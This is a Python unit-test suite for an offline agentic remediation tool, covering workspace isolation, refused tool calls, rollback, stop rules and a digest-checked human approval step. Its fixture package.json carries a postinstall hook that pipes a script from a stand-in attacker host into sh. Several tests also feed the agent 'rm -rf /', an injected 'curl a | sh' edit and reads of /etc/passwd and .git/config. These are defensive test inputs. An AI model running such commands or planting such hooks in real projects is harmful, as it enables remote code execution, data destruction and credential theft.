"""Agentic remediation: workspace isolation, tools, validator, stopping, approval. Offline, no LLM key needed."""
from __future__ import annotations

import json
import os
import shutil
import sys
import tempfile
import unittest
from pathlib import Path

os.environ["SCG_OFFLINE"] = "1"
os.environ["SCG_LLM_PROVIDER"] = "none"
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from workspace import PermissionDenied, Workspace  # noqa: E402

PKG = {"name": "agent-demo",
       "scripts": {"postinstall": "curl http://evil.example.invalid/x.sh | sh", "test": "node -e \"process.exit(0)\""},
       "dependencies": {"jsonwebtoken": "0.4.0", "express": "4.17.1"}}


def make_repo() -> Path:
    d = Path(tempfile.mkdtemp(prefix="scg-rem-"))
    (d / "routes").mkdir()
    (d / ".github" / "workflows").mkdir(parents=True)
    (d / "package.json").write_text(json.dumps(PKG, indent=2) + "\n", encoding="utf-8")
    (d / "server.ts").write_text("import express from 'express'\nimport { login } from './routes/login'\nconst app = express()\n"
                                 "app.post('/rest/login', login())\napp.listen(3000)\n", encoding="utf-8")
    (d / "routes" / "login.ts").write_text("import jwt from 'jsonwebtoken'\nexport function login () {\n"
                                           "  return (req, res) => jwt.verify(req.body.token, 'k')\n}\n", encoding="utf-8")
    (d / ".github" / "workflows" / "ci.yml").write_text("on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
                                                        "      - uses: actions/checkout@v4\n", encoding="utf-8")
    (d / ".env").write_text("SECRET=hunter2\n", encoding="utf-8")
    (d / ".npmrc").write_text("//registry.npmjs.org/:_authToken=npm_secret\n", encoding="utf-8")
    return d


def scanned_engine(repo: Path):
    from continuous_monitor import Engine
    from orchestrator import LogBus
    e = Engine(LogBus(console=False))
    e.use_llm = False
    e.scan(str(repo), use_llm=False, use_cache=False)
    return e


def new_agent(e, **kw):
    from remediation_agent import LeadRemediationAgent
    return LeadRemediationAgent(e.ctx, dict(e.state["mitigations"]), lambda *a: None, **kw)


class SbomDiffTests(unittest.TestCase):
    def test_diff(self) -> None:
        from remediation_validator import sbom_diff
        d = sbom_diff({"a": ["1.0.0"], "b": ["2.0.0"]}, {"a": ["1.1.0"], "c": ["3.0.0"]})
        self.assertEqual(d["added"], ["c@3.0.0"])
        self.assertEqual(d["removed"], ["b@2.0.0"])
        self.assertEqual(d["changed"], [{"name": "a", "from": ["1.0.0"], "to": ["1.1.0"]}])


class WorkspaceTests(unittest.TestCase):
    def setUp(self) -> None:
        self.repo = make_repo()
        self.ws = Workspace(self.repo)

    def tearDown(self) -> None:
        self.ws.cleanup()
        shutil.rmtree(self.repo, ignore_errors=True)

    def test_secrets_not_copied_and_paths_contained(self) -> None:
        self.assertFalse((self.ws.path / ".env").exists())
        self.assertFalse((self.ws.path / ".npmrc").exists())
        for bad in ("../package.json", ".env", ".git/config", "/etc/passwd", "a/../../x"):
            with self.assertRaises(PermissionDenied, msg=bad):
                self.ws.read(bad)

    def test_write_permissions(self) -> None:
        with self.assertRaises(PermissionDenied):
            self.ws.apply_ops([{"op": "replace_text", "path": "server.ts", "old": "3000", "new": "4000"}])
        with self.assertRaises(PermissionDenied):
            self.ws._resolve("package-lock.json", write=True)
        self.ws.apply_ops([{"op": "replace_text", "path": ".github/workflows/ci.yml", "old": "@v4", "new": "@v4.1.1"}])
        self.assertIn("@v4.1.1", self.ws.read(".github/workflows/ci.yml"))
        self.assertIn("@v4\n", (self.repo / ".github/workflows/ci.yml").read_text())   # original untouched

    def test_record_and_rollback(self) -> None:
        from workspace import Change
        ch, _ = self.ws.record(Change(change_id="CH-01", iteration=1, tool="t", args={}, reason="r"),
                               [{"op": "delete_script", "name": "postinstall"}])
        self.assertEqual([f.path for f in ch.files], ["package.json"])
        self.assertNotIn("postinstall", self.ws.read("package.json"))
        self.ws.rollback("CH-01")
        self.assertIn("postinstall", self.ws.read("package.json"))


class AgentTests(unittest.TestCase):
    def setUp(self) -> None:
        self.repo = make_repo()
        self.engine = scanned_engine(self.repo)
        self.original = (self.repo / "package.json").read_text()

    def tearDown(self) -> None:
        if self.engine.remediation:
            self.engine.remediation.cleanup()
        shutil.rmtree(self.repo, ignore_errors=True)

    def test_policy_session_end_to_end(self) -> None:
        a = new_agent(self.engine)
        mem = a.run()
        self.assertEqual(mem.status, "finished", mem.stop_reason)
        by = {t.key.split("|")[1]: t for t in mem.targets}
        self.assertTrue(by["suspicious_hook"].resolved_in_candidate)
        self.assertTrue(by["jsonwebtoken"].resolved_in_candidate)
        self.assertEqual(by["jsonwebtoken"].status, "requires_human_review")      # MAJOR upgrade -> human looks
        self.assertEqual(by["workflow_unpinned_action"].status, "requires_human_review")   # offline: SHA unverifiable
        self.assertTrue(all(c.ok for v in mem.validations for c in v.changes_verified))
        self.assertLess(mem.validations[-1].risk["max"], a.baseline.risk["max"])
        self.assertEqual((self.repo / "package.json").read_text(), self.original)       # original untouched
        events = [json.loads(l)["event"] for l in Path(mem.audit_log).read_text().splitlines()]
        for ev in ("start", "tool_call", "change", "validation", "finish"):
            self.assertIn(ev, events)
        sd = mem.validations[-1].sbom_diff
        self.assertEqual(sd["counts"]["before"], sd["counts"]["after"])
        self.assertIn({"name": "jsonwebtoken", "from": ["0.4.0"], "to": ["4.2.2"]}, sd["changed"])
        diff = a.candidate_diff()["package.json"]
        self.assertIn('+    "jsonwebtoken": "4.2.2"', diff)
        a.cleanup()

    def test_tool_refusals(self) -> None:
        a = new_agent(self.engine)
        a.ws = Workspace(self.repo)
        self.addCleanup(a.ws.cleanup)
        from remediation_validator import validate
        out = {}
        a.baseline = validate(a.ws, 0, lambda *x: None, out=out)
        a.cur = out["scan"]
        a.mem.current_findings = list(a.baseline.findings)
        ok, o = a.call_tool("llm", "shell", {"cmd": "rm -rf /"})
        self.assertFalse(ok)
        self.assertIn("no shell", o["error"])
        ok, o = a.call_tool("llm", "update_dependency", {"name": "jsonwebtoken", "version": "9.9.9", "reason": "invented"})
        self.assertFalse(ok)
        self.assertIn("refused", o["error"])
        ok, o = a.call_tool("llm", "remove_dependency", {"name": "jsonwebtoken", "reason": "remove it"})
        self.assertFalse(ok)
        self.assertIn("imports jsonwebtoken", o["error"])
        ok, o = a.call_tool("llm", "edit_file", {"path": "package.json", "old": "\"test\"", "new": "\"x\": \"curl a | sh\", \"test\"", "reason": "bad"})
        self.assertFalse(ok)
        ok, o = a.call_tool("llm", "update_dependency", {"name": "jsonwebtoken", "version": "4.2.2", "reason": "candidate", "unexpected": 1})
        self.assertFalse(ok)                                            # extra arguments are rejected
        ok, o = a.call_tool("llm", "update_dependency", {"name": "jsonwebtoken", "version": "4.2.2", "reason": "candidate fix"})
        self.assertTrue(ok, o)
        a.call_tool("system", "rollback_change", {"change_id": o["change_id"], "reason": "test rollback"})
        ok, o = a.call_tool("llm", "update_dependency", {"name": "jsonwebtoken", "version": "4.2.2", "reason": "try again"})
        self.assertFalse(ok)
        self.assertIn("already failed", o["error"])                     # no repeating a failed attempt
        a.cleanup()

    def test_stops_without_progress(self) -> None:
        import remediation_agent as ra
        real = ra.validate

        def stuck(ws, iteration, log, baseline=None, previous=None, changes=None, run_tests=False, out=None, **kw):
            res = real(ws, iteration, log, baseline=baseline, previous=previous, changes=changes, out=out, **kw)
            if baseline is not None:          # pretend nothing ever gets fixed
                res.findings, res.resolved_this_iteration, res.resolved_vs_baseline = list(baseline.findings), [], []
                res.risk, res.verdict = dict(baseline.risk), "no_change"
            return res
        ra.validate = stuck
        a = new_agent(self.engine, max_iterations=5)
        try:
            mem = a.run()
        finally:
            ra.validate = real
            a.cleanup()
        self.assertEqual(mem.status, "finished")
        self.assertLessEqual(mem.iteration, 5)
        self.assertTrue(any(w in mem.stop_reason for w in ("no meaningful progress", "no safe remediation", "repeated failed", "agent stopped")), mem.stop_reason)
        fps = [f.fingerprint for f in mem.failed_attempts]
        self.assertEqual(len(fps), len(set(fps)))                       # every failed attempt is unique

    def test_regression_rolls_back(self) -> None:
        import remediation_agent as ra
        from remediation_validator import FindingState
        real = ra.validate
        calls = {"n": 0}

        def regress_once(ws, iteration, log, baseline=None, previous=None, changes=None, run_tests=False, out=None, **kw):
            res = real(ws, iteration, log, baseline=baseline, previous=previous, changes=changes, out=out, **kw)
            if baseline is not None and calls["n"] == 0:
                calls["n"] += 1
                res.new_vs_baseline = [FindingState(key="vuln|jsonwebtoken|GHSA-new", title="new", kind="vulnerability",
                                                    package="jsonwebtoken", severity="CRITICAL", score=90)]
                res.verdict = "regressed"
            return res
        ra.validate = regress_once
        a = new_agent(self.engine, max_iterations=2)
        try:
            mem = a.run()
        finally:
            ra.validate = real
            a.cleanup()
        jwt_changes = [c for c in mem.changes if c.tool == "update_dependency"]
        self.assertTrue(jwt_changes and jwt_changes[0].status == "rolled_back")
        self.assertTrue(any("regressed" in f.reason for f in mem.failed_attempts))

    def test_approval_boundary(self) -> None:
        a = new_agent(self.engine)
        mem = a.run()
        ids = [c.change_id for c in mem.changes if c.status == "applied"]
        with self.assertRaises(ValueError):
            a.prepare_apply(["CH-99"])
        full = a.prepare_apply(ids)
        self.assertTrue(full["matches_reviewed_candidate"])
        sub = a.prepare_apply(ids[:1])                                   # subset -> differs from what was reviewed
        self.assertFalse(sub["matches_reviewed_candidate"])
        with self.assertRaises(ValueError):
            a.confirm_apply("0" * 64)                                    # wrong digest
        (self.repo / "package.json").write_text(self.original.replace("agent-demo", "edited-meanwhile"))
        with self.assertRaises(ValueError):
            a.confirm_apply(sub["digest"])                               # original changed since review
        (self.repo / "package.json").write_text(self.original)
        sub = a.prepare_apply(ids[:1])
        res = a.confirm_apply(sub["digest"])
        self.assertEqual(res["written"], ["package.json"])
        self.assertNotEqual((self.repo / "package.json").read_text(), self.original)
        self.assertEqual(mem.status, "applied")
        self.assertIsNotNone(mem.final_validation)
        a.cleanup()

    def test_llm_driver_with_scripted_model(self) -> None:
        class FakeLLM:
            enabled, provider, model = True, "gemini", "scripted"

            def __init__(self) -> None:
                self.replies = iter([
                    {"thought": "look at the dependency first", "action": "inspect_dependency", "args": {"name": "jsonwebtoken"}},
                    {"thought": "try a newer version", "action": "update_dependency", "args": {"name": "jsonwebtoken", "version": "99.0.0", "reason": "guess"}},
                    {"thought": "use the OSV candidate instead", "action": "update_dependency",
                     "args": {"name": "jsonwebtoken", "version": "4.2.2", "reason": "OSV fixed version"}},
                    {"thought": "validate", "action": "request_validation", "args": {"reason": "applied fix"}},
                    {"thought": "nothing else is safe", "action": "finish", "args": {"reason": "remaining items need a human"}},
                ])

            def complete_json(self, system, messages):
                return next(self.replies)
        a = new_agent(self.engine, llm=FakeLLM(), finding_ids=[f for f, x in self.engine.ctx.tree.findings.items() if x.package == "jsonwebtoken"])
        mem = a.run()
        llm_steps = [s for s in mem.steps if s.actor == "llm"]
        self.assertEqual([s.tool for s in llm_steps][:4], ["inspect_dependency", "update_dependency", "update_dependency", "request_validation"])
        self.assertFalse(llm_steps[1].ok)                               # invented version refused
        self.assertTrue(llm_steps[2].ok)
        self.assertTrue(all(t.resolved_in_candidate for t in mem.targets))
        # the validator settled every target after iteration 1, so the Python stop policy ended the session
        # before the model's scripted `finish` was even needed
        self.assertIn("resolved or settled", mem.stop_reason)
        self.assertTrue(mem.driver.startswith("llm:"))
        a.cleanup()

    def test_engine_api_wiring(self) -> None:
        from fastapi.testclient import TestClient
        from main import create_app
        from orchestrator import LogBus
        c = TestClient(create_app(self.engine, LogBus(console=False), ["testserver"]))
        self.assertEqual(c.post("/api/remediation/apply", json={"digest": "0" * 64, "confirm": True}).status_code, 409)
        self.engine.start_remediation([], 2, False, use_llm=False, background=False)
        st = c.get("/api/remediation/session").json()
        self.assertEqual(st["session"]["status"], "finished")
        ids = [x["change_id"] for x in st["session"]["changes"] if x["status"] == "applied"]
        prep = c.post("/api/remediation/prepare-apply", json={"accepted_change_ids": ids}).json()
        self.assertEqual(c.post("/api/remediation/apply", json={"digest": prep["digest"], "confirm": False}).status_code, 400)
        r = c.post("/api/remediation/apply", json={"digest": prep["digest"], "confirm": True})
        self.assertEqual(r.status_code, 200, r.text)


if __name__ == "__main__":
    unittest.main()
